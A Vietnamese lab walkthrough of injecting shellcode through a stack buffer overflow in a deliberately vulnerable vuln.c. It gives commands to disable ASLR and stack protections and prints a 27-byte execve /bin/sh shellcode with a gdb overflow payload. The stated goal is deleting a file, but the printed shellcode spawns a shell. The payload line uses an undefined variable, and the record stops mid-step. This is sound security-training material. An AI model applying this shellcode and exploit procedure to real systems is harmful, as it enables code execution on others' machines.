![image](https://github.com/user-attachments/assets/4173c889-4857-4d8c-91bb-6aae88427f83)### Chi tiết injection code để delete file dummyfile
***
#### Điểm qua file vuln.c và file_del.asm  

![image](https://github.com/user-attachments/assets/c6588ec0-9d20-42d3-b849-0df865aa5a24)

![image](https://github.com/user-attachments/assets/5859be38-860d-4e39-8bfe-3975f152106f)

***
#### Các bước thực hiện
* Bước 1: ánh xạ file vào máy ảo docker
  ```
  docker run -it --privileged -v "C:/Users/Win 10/Seclabs:/home/seed/seclabs" img4lab
  ```
* Bước 2: tắt cơ chế bảo mật để có thể injection code
  ```
  sudo ln -sf /bin/zsh /bin/sh
  ```
* Bước 3: tắt cơ chế cấp phát địa chỉ ngẫu nhiên
  ```
  sudo sysctl -w kernel.randomize_va_space=0
  ```
* Bước 4:

  biên dịch file file_del.asm
  ```
  nasm -g -f elf file_del.asm
  ```
  liên kết file
  ```
  ld -m elf_i386 -o file_del file_del.o
  ```
* Bước 5: Xem file sh.asm có tổng cộng bao nhiêu bytes
  ```
  for i in $(objdump -d sh |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
  ```
  ![image](https://github.com/user-attachments/assets/95321099-960b-442c-a7d9-c82319c843eb)


  => 27 bytes
  ```
  \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80
  ```
* Bước 6: biên dịch file vuln.c
  ```
  gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
  ```
* Bước 7: tạo một file mới tên là dummyfile
  ![image](https://github.com/user-attachments/assets/0c74e8ce-e0b8-4068-b22c-e789b8058622)
* Bước 8: điểm qua stack frame của hàm main
  ![image](https://github.com/user-attachments/assets/b9aedf21-753b-4e90-a84a-0e3586573bdf)

  ta sẽ phải tràn code từ buf xuống return address và thay giá trị return address

  ta đã có 27 bytes của shellcode vào biến buf vậy chỉ cần thêm 37 bytes ngẫu nhiên sẽ tràn hết buf + thêm 4 bytes tràn xuống ebp là sẽ tới được return address
* Bước 9: gdb để chạy và xem chương trình
  ```
  gdb -q vuln.out
  ```
  ![image](https://github.com/user-attachments/assets/8f00e862-eafe-482d-899e-d2ac2767c489)

  Đặt 2 breakpoints: 1 khi stackframe được thiết lập tại 0x08048441. 2 tại 0x0804846b
  ![image](https://github.com/user-attachments/assets/72710aab-a204-40eb-aa29-9ce1dc499b2b)


  Chạy chương trình:
  ```
  r $(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80'+'41'*a+'\xff\xff\xff\xff')")
  ```
  Tại breakpoint thứ nhất xem stack từ esp `x/80xb $esp`
  ![image](https://github.com/user-attachments/assets/00e71721-7c68-45a3-9ce0-6499e37f0ae0)


  Tại breakpoint thứ 2:
  

